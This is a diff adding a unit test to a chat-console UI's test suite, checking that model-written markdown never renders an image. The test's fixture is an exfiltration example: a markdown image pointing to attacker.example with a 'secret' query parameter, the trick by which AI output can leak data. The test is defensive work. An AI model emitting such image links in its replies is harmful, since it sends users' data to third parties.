@@ -108,6 +108,13 @@ describe("ConsoleTurn new step kinds", () => {
     expect(screen.getByText(prompt)).toBeInTheDocument();
   });
 
+  it("never loads an image from model-written markdown", () => {
+    const text = "Done.\n\n![x](https://attacker.example/p.png?d=secret)";
+    const { container } = render(<Turn turn={builder([{ id: "n1", kind: "note", text, markdown: true }])} />);
+    expect(screen.getByText("Done.")).toBeInTheDocument();
+    expect(container.querySelector("img")).toBeNull();
+  });
+
   it("keeps raw angle brackets inside a markdown question", () => {
     const prompt = "Approve this?\n\n- send it to the <front desk>";
     const question = { prompt, options: [], multiSelect: false, step: 1, total: 1 };
